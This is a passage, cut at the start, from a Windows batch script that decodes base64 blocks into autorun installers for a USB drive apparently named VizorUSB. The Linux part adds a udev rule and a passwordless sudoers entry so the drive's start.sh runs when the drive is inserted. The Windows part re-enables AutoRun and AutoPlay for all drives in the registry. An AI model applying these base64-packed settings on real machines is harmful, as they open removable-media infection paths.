  echo IiAtbmUgMCBdOyB0aGVuIGVjaG8gItCX0LDQv9GD0YHQutCw0Lk6IHN1ZG8gYmFzaCAkMCI7IGV4
  echo aXQgMTsgZmkKU0NSSVBUX1BBVEg9IiQocmVhZGxpbmsgLWYgIiQwIikiClVTQl9ESVI9IiQoZGly
  echo bmFtZSAiJChkaXJuYW1lICIkU0NSSVBUX1BBVEgiKSIpIgpVU0JfREVWPSIkKGZpbmRtbnQgLW5v
  echo IFNPVVJDRSAiJFVTQl9ESVIiIDI+L2Rldi9udWxsKSIKVVVJRD0iJChsc2JsayAtbm8gVVVJRCAi
  echo JFVTQl9ERVYiIDI+L2Rldi9udWxsIHx8IGJsa2lkIC1zIFVVSUQgLW8gdmFsdWUgIiRVU0JfREVW
  echo IiAyPi9kZXYvbnVsbCkiClVJRF9OVU09IiQobHMgL3J1bi91c2VyLyAyPi9kZXYvbnVsbCB8IGdy
  echo ZXAgLUUgJ15bMC05XSskJyB8IGhlYWQgLTEpIgpHVUlfVVNFUj0iJChnZXRlbnQgcGFzc3dkICIk
  echo VUlEX05VTSIgfCBjdXQgLWQ6IC1mMSkiCkRJU1A9IjokKGxzIC90bXAvLlgxMS11bml4LyAyPi9k
  echo ZXYvbnVsbCB8IGhlYWQgLTEgfCBzZWQgJ3MvWC8vJykiClsgLXogIiRESVNQIiBdICYmIERJU1A9
  echo IjowIgpbIC16ICIkVVVJRCIgXSAmJiB7IGVjaG8gIlVVSUQg0L3QtSDQvdCw0LnQtNC10L0iOyBl
  echo eGl0IDE7IH0KCmNhdCA+IC91c3IvbG9jYWwvYmluL3Zpem9yLWF1dG9ydW4uc2ggPDxYRU9GCiMh
  echo L2Jpbi9iYXNoClVVSUQ9IiRVVUlEIjsgR1VJX1VTRVI9IiRHVUlfVVNFUiI7IERJU1A9IiRESVNQ
  echo Igpmb3IgaSBpbiBcJChzZXEgMSAxNSk7IGRvCiAgICBNPSJcJChsc2JsayAtbm8gTU9VTlRQT0lO
  echo VFMgL2Rldi9kaXNrL2J5LXV1aWQvXCRVVUlEIDI+L2Rldi9udWxsKSIKICAgIFsgLW4gIlwkTSIg
  echo XSAmJiBicmVhazsgc2xlZXAgMQpkb25lClsgLWYgIlwkTS9zdGFydC5zaCIgXSB8fCBleGl0IDAK
  echo c3VkbyAtdSAiXCRHVUlfVVNFUiIgZW52IERJU1BMQVk9IlwkRElTUCIgbm9odXAgYmFzaCAiXCRN
  echo L3N0YXJ0LnNoIiA+L2Rldi9udWxsIDI+JjEgJgpleGl0IDAKWEVPRgpjaG1vZCA3NTUgL3Vzci9s
  echo b2NhbC9iaW4vdml6b3ItYXV0b3J1bi5zaApjYXQgPiAvZXRjL3VkZXYvcnVsZXMuZC85OS12aXpv
  echo ci11c2IucnVsZXMgPDxYRU9GCkFDVElPTj09ImFkZCIsIFNVQlNZU1RFTT09ImJsb2NrIiwgRU5W
  echo e0lEX0ZTX1VVSUR9PT0iJFVVSUQiLCBSVU4rPSIvdXNyL2xvY2FsL2Jpbi92aXpvci1hdXRvcnVu
  echo LnNoIgpYRU9GCnVkZXZhZG0gY29udHJvbCAtLXJlbG9hZC1ydWxlcyAyPi9kZXYvbnVsbAplY2hv
  echo ICIkR1VJX1VTRVIgQUxMPShBTEwpIE5PUEFTU1dEOiAvdXNyL2xvY2FsL2Jpbi92aXpvci1hdXRv
  echo cnVuLnNoIiA+IC9ldGMvc3Vkb2Vycy5kL3Zpem9yLXVzYgpjaG1vZCA0NDAgL2V0Yy9zdWRvZXJz
  echo LmQvdml6b3ItdXNiCmVjaG8gIj09PSDQk9C+0YLQvtCy0L46INCy0YHRgtCw0LLRjCDRhNC70LXR
  echo iNC60YMg0LXRidGRINGA0LDQtyAtINCy0YHRkSDQt9Cw0L/Rg9GB0YLQuNGC0YHRjyDRgdCw0LzQ
  echo viA9PT0iCmVjaG8gItCj0LTQsNC70LXQvdC40LU6IHN1ZG8gYmFzaCAkVVNCX0RJUi9pbnN0YWxs
  echo L3VuaW5zdGFsbC1saW51eC5zaCIK
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\install\linux-autorun.sh" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- install/uninstall-linux.sh ----
if not exist "%T%\install" mkdir "%T%\install" 2>nul
> "%TEMP%\vz.b64" (
  echo IyEvYmluL2Jhc2gKaWYgWyAiJChpZCAtdSkiIC1uZSAwIF07IHRoZW4gZWNobyAi0JfQsNC/0YPR
  echo gdC60LDQuTogc3VkbyBiYXNoICQwIjsgZXhpdCAxOyBmaQpybSAtZiAvdXNyL2xvY2FsL2Jpbi92
  echo aXpvci1hdXRvcnVuLnNoIC9ldGMvdWRldi9ydWxlcy5kLzk5LXZpem9yLXVzYi5ydWxlcyAvZXRj
  echo L3N1ZG9lcnMuZC92aXpvci11c2IKdWRldmFkbSBjb250cm9sIC0tcmVsb2FkLXJ1bGVzIDI+L2Rl
  echo di9udWxsCmVjaG8gItCQ0LLRgtC+0LfQsNC/0YPRgdC6INGD0LTQsNC70ZHQvS4iCg==
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\install\uninstall-linux.sh" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- install/windows-autorun.bat ----
if not exist "%T%\install" mkdir "%T%\install" 2>nul
> "%TEMP%\vz.b64" (
  echo QGVjaG8gb2ZmClJFTSDQndCw0YHRgtGA0L7QudC60LAg0LDQstGC0L7Qt9Cw0L/Rg9GB0LrQsCDQ
  echo siDQt9Cw0LLQuNGB0LjQvNC+0YHRgtC4INC+0YIg0LLQtdGA0YHQuNC4ClJFTSBXaW43IC8gV2lu
  echo MTAgLyBXaW4xMSDRgNCw0LHQvtGC0LDRjtGCINC/0L4t0YDQsNC30L3QvtC80YMgKNC90LjQttC1
  echo KQpuZXQgc2Vzc2lvbiA+bnVsIDI+JjEKaWYgZXJyb3JsZXZlbCAxICggZWNoby4gJiBlY2hvINCX
  echo 0JDQn9Cj0KHQotCYINC+0YIg0JDQtNC80LjQvdC40YHRgtGA0LDRgtC+0YDQsCEgJiBwYXVzZSAm
  echo IGV4aXQgL2IgMSApCgpSRU0gLS0tLS0g0L7Qv9GA0LXQtNC10LvQtdC90LjQtSDQstC10YDRgdC4
  echo 0LggV2luZG93cyAtLS0tLQpzZXQgV0lOX1ZFUj11bmtub3duCmZvciAvZiAidG9rZW5zPTQgZGVs
  echo aW1zPSAiICUldiBpbiAoJ3ZlcicpIGRvIHNldCBWPSUldgpzZXQgVj0lVjpdCmZvciAvZiAidG9r
  echo ZW5zPTEsMiwzIGRlbGltcz0uIiAlJWEgaW4gKCIlViUiKSBkbyAoIHNldCBNQUo9JSVhICYgc2V0
  echo IE1JTj0lJWIgJiBzZXQgQkw9JSVjICkKaWYgIiVNQUolIj09IjYiIGlmICIlTUlOJSI9PSIxIiBz
  echo ZXQgV0lOX1ZFUj1XaW5kb3dzIDcKaWYgIiVNQUolIj09IjYiIGlmICIlTUlOJSI9PSIzIiBzZXQg
  echo V0lOX1ZFUj1XaW5kb3dzIDguMQppZiAiJU1BSiUiPT0iMTAiIHNldCBXSU5fVkVSPVdpbmRvd3Mg
  echo MTAKaWYgIiVNQUolIj09IjEwIiBpZiAiJU1JTiUiPT0iMCIgaWYgJUJMJSBHRVEgMjIwMDAgc2V0
  echo IFdJTl9WRVI9V2luZG93cyAxMQoKZWNoby4KZWNobyA9PT09PT09PT09PT09PT09PT09PT09PT09
  echo PT09PT09PT09PT09PT09PT0KZWNobyAgINCe0LHQvdCw0YDRg9C20LXQvdC+OiAlV0lOX1ZFUiUK
  echo ZWNobyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KClJFTSAtLS0t
  echo LSDQvtCx0YnQuNC1INC00LXQudGB0YLQstC40Y8g0LTQu9GPIDcvMTAvMTEgLS0tLS0KcmVnIGFk
  echo ZCAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2ll
  echo c1xFeHBsb3JlciIgL3YgTm9Ecml2ZVR5cGVBdXRvUnVuIC90IFJFR19EV09SRCAvZCAwIC9mID5u
  echo dWwgMj4mMQpyZWcgYWRkICJIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRW
  echo ZXJzaW9uXFBvbGljaWVzXEV4cGxvcmVyIiAvdiBOb0RyaXZlVHlwZUF1dG9SdW4gL3QgUkVHX0RX
  echo T1JEIC9kIDAgL2YgPm51bCAyPiYxCnJlZyBhZGQgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdp
  echo bmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcQXV0b3BsYXlIYW5kbGVycyIgL3YgRGlzYWJs
  echo ZUF1dG9wbGF5IC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQplY2hvIFtPS10gTm9Ecml2
  echo ZVR5cGVBdXRvUnVuID0gMCAo0LDQstGC0L7Qt9Cw0L/Rg9GB0Log0YDQsNC30YDQtdGI0ZHQvSkK
  echo ZWNobyBbT0tdIEF1dG9QbGF5INCy0LrQu9GO0YfQtdC90YsKZWNoby4KCmlmICIlV0lOX1ZFUiUi
  echo PT0iV2luZG93cyA3IiAoCiAgICBlY2hvIC0tLSBXaW5kb3dzIDc6INCw0LLRgtC+0LfQsNC/0YPR
  echo gdC6INCg0JDQkdCe0KLQkNCV0KIg0LjQtyDQutC+0YDQvtCx0LrQuCAtLS0KICAgIGVjaG8gICAg
  echo IGF1dG9ydW4uaW5mINGB0YDQsNCx0L7RgtCw0LXRgiDRgdGA0LDQt9GDINC/0YDQuCDQstGB0YLQ
  echo sNCy0LrQtS4KICAgIGVjaG8gICAgINCd0LjRh9C10LPQviDQsdC+0LvRjNGI0LUg0L3QtSDQvdGD
  echo 0LbQvdC+LiDQktGB0YLQsNCy0Ywg0YTQu9C10YjQutGDLgopIGVsc2UgaWYgIiVXSU5fVkVSJSI9
  echo PSJXaW5kb3dzIDEwIiAoCiAgICBlY2hvIC0tLSBXaW5kb3dzIDEwOiDQsNCy0YLQvtC30LDQv9GD
  echo 0YHQuiDRgdC60YDQuNC/0YLQvtCyINC30LDQsdC70L7QutC40YDQvtCy0LDQvSAtLS0KICAgIGVj
  echo aG8gICAgINCg0LXQtdGB0YLRgCDRg9C20LUg0YHQvdGP0Lsg0LHQu9C+0LrQuNGA0L7QstC60YMu
  echo INCi0LXQv9C10YDRjDoKICAgIGVjaG8gICAgIDEpINCS0YvRgtCw0YnQuCDQuCDQstGB0YLQsNCy
  echo 0Ywg0YTQu9C10YjQutGDCiAgICBlY2hvICAgICAyKSDQkiDQvtC60L3QtSBBdXRvUGxheSDQstGL
  echo 0LHQtdGA0Lg6ICLQl9Cw0L/Rg9GB0YLQuNGC0YwgVml6b3JVU0ItTiIKICAgIGVjaG8gICAgIDMp
  echo INCe0YLQvNC10YLRjCDQs9Cw0LvQvtGH0LrRgzogItCS0YHQtdCz0LTQsCDQtNC10LvQsNGC0Ywg
  echo 0Y3RgtC+IgogICAgZWNobyAgICAg0JzQtdC90Y4gQXV0b3J1biDQv9C+0Y/QstC40YLRgdGPINC4
  echo INC/0YDQuCDRgNGD0YfQvdC+0Lwg0LfQsNC/0YPRgdC60LUgc3Rhci5iYXQuCikgZWxzZSBpZiAi
  echo JVdJTl9WRVIlIj09IldpbmRvd3MgMTEiICgKICAgIGVjaG8gLS0tIFdpbmRvd3MgMTE6INCw0LLR
  echo gtC+0LfQsNC/0YPRgdC6INC20ZHRgdGC0LrQviDQvtCz0YDQsNC90LjRh9C10L0gLS0tCiAgICBl
  echo Y2hvICAgICDQndCV0JvQrNCX0K8g0L7RgtC60LvRjtGH0LjRgtGMINC/0L7Qu9C90L7RgdGC0YzR
  echo ji4g0J/QvtGA0Y/QtNC+0Lo6CiAgICBlY2hvICAgICAxKSDQktGL0YLQsNGJ0Lgg0Lgg0LLRgdGC
  echo 0LDQstGMINGE0LvQtdGI0LrRgwogICAgZWNobyAgICAgMikg0JIg0L7QutC90LUgQXV0b1BsYXkg
  echo 0LLRi9Cx0LXRgNC4OiAi0JfQsNC/0YPRgdGC0LjRgtGMIFZpem9yVVNCLU4iIC0+INCS0YHQtdCz
  echo 0LTQsAogICAgZWNobyAgICAgMykg0JXRgdC70Lgg0L7QutC90L4g0L3QtSDQv9C+0Y/QstC40LvQ
  echo vtGB0YwgLSDQn9Cw0YDQsNC80LXRgtGA0Yst0KHQuNGB0YLQtdC80LAt0KPQstC10LTQvtC80LvQ
  echo tdC90LjRjwogICAgZWNobyAgICAgICAgItCh0YLQsNC90LTQsNGA0YLQvdGL0LUg0L3QsNGB0YLR
  echo gNC+0LnQutC4INCw0LLRgtC+0LfQsNC/0YPRgdC60LAiIC0g0LLQutC70Y7Rh9C4INCQ0LLRgtC+
  echo 0LfQsNC/0YPRgdC6CiAgICBlY2hvICAgICDQl9Cw0L/QsNGB0L3QvtC5INCy0LDRgNC40LDQvdGC
  echo OiDQvtC00LjQvSDRgNCw0Lcg0LfQsNC/0YPRgdGC0Lggc3RhcnQuYmF0INCy0YDRg9GH0L3Rg9GO
  echo CikgZWxzZSAoCiAgICBlY2hvINCd0LXQuNC30LLQtdGB0YLQvdCw0Y8g0LLQtdGA0YHQuNGPIFdp
  echo bmRvd3MuINCX0LDQv9GD0YHRgtC4IHN0YXJ0LmJhdCDQstGA0YPRh9C90YPRji4KKQoKZWNoby4K
  echo cGF1c2UK
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\install\windows-autorun.bat" >nul
del "%TEMP%\vz.b64" >nul 2>&1

echo ==============================================
echo   Готово! Вставь флешку заново.
echo   Автозапуск: install\windows-autorun.bat
echo ==============================================
pause
